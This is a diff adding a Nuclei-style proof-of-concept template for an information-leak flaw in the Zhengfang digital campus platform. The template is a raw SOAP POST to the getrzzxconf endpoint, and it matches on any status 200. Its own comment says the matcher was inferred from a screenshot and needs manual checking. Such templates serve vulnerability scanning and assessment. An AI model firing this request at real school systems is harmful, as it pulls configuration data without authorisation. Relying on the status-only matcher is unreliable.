@@ -1,0 +1,20 @@
+id: poc-eb689052e48deba0f076
+info:
+  name: 正方数字化校园平台getrzzxconf存在信息泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eb689052e48deba0f0769789cf2f73dc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eb689052e48deba0f0769789cf2f73dc
+http:
+- raw:
+  - "POST /zfca/axis/RzzxConfManage HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=C5BA8FCE6078136DED5E9ABFAFBD023D\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 402\n\n<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:pub=\"http://pubService.webServices.zfca.zfsoft.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <pub:getrzzxconf soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"/>\n   </soapenv:Body>\n\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
